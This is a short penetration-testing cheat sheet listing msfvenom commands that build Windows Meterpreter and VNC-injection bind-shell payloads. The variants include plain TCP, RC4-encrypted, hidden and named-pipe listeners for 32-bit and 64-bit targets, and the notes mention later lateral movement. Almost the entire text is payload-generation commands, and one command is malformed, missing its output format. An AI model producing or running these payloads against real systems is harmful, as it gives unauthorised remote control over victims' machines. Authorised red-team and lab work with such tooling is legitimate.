# Bind Shells

## Interactive Shells

TODO: Take the namepipe meterpreter payloads to the post exploitation section for lateral movement

1. x86 (32-bit) Payloads

```
$ msfvenom -p windows/meterpreter/bind_tcp lport=<PORT> -f exe -o met-x86.exe

$ msfvenom -p windows/meterpreter/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o met-x86.exe

$ msfvenom -p windows/meterpreter/bind_hidden_tcp ahost=<IP> lport=<PORT> -f exe -o hidden-met-x64.exe

$ msfvenom -p windows/meterpreter/bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f -o met-x86.exe
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=<PORT> -f exe -o met-x64.exe

$ msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o met-x64.exe
```

For the SMB pipe the default for LPORT will always be port **445** 

```
$ msfvenom -p windows/x64/meterpreter/bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f exe -o met-x64.exe
```

## VNC

1. x86 (32-bit) Payloads

```
$ msfvenom -p windows/vncinject/bind_tcp rhost=<target_IP> lport=<PORT> -f exe -o vnc-x86.exe

$ msfvenom -p cmd/windows/powershell/vncinject/bind_tcp rhost=<target_IP> lport=<PORT> -f raw -o vnc-x86.ps1
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/vncinject/bind_tcp rhost=<target_IP> lport=<PORT> -f exe -o vnc-x86-64.exe
```